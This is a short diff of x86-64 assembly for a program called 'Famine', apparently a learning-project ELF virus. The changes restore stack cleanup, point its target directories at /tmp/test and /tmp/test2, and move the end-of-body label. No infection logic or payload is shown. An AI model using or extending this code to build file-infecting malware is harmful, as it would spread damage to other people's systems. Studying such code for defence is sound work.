@@ -39,8 +39,6 @@ _start:
     mov rsi, dir2Len
     call _readDir
 	_final_jmp:
-	; mov rsp, rbp
-	; pop rbp
 	pop r15
 	pop r14
 	pop r13
@@ -55,6 +53,8 @@ _start:
 	pop rcx
 	pop rbx
 	pop rax
+	mov rsp, rbp
+	pop rbp
 	_bf_exit:
     jmp _Famine_exit
 
@@ -344,13 +344,13 @@ _strlen:
 		mov rax, rcx
 		ret
 
-dir1        db  "test", 0
+dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
-dir2        db  "test/OK", 0
+dir2        db  "/tmp/test2", 0
 dir2Len    equ $ - dir2
 signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
+_end:
 
 ;debug
 tiret       db  "..---..",0
 back        db  10, 0
-_end:
